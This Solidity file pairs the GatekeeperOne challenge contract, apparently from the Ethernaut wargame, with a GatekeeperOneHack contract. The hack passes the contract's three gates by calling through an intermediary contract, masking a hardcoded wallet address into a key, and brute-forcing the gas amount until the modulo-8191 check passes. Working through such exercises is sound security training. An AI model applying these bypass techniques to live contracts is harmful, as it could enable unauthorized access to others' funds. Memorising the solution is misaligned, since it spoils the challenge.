// SPDX-License-Identifier: MIT
pragma solidity 0.6.4;

contract GatekeeperOne {

  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    require(gasleft() % 8191 == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
      require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
      require(uint32(uint64(_gateKey)) == uint16(tx.origin), "GatekeeperOne: invalid gateThree part three");
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}


contract GatekeeperOneHack {

    // // wallet 0x95C9CE2CF8A726017Ba62A7785b5575DD06DD899
    bytes8 public txOrigin16 = 0x85b5575DD06DD899;
    bytes8 public key = txOrigin16 & 0xffffffff0000ffff;

    GatekeeperOne gatekeeperOne;
    
    constructor(address _gatekeeperOne) public {
        gatekeeperOne = GatekeeperOne(_gatekeeperOne);
        letMeIn();
    }

    function letMeIn() public {
        bytes memory encodeParams = abi.encodeWithSignature("enter(bytes8)", key);
        for(uint256 i = 0; i < 120; i++) {
            (bool result,) = address(gatekeeperOne).call{gas: i + 150 + 8191*3}(encodeParams);
            if (result) {
                break;
            }
        }
    }

}
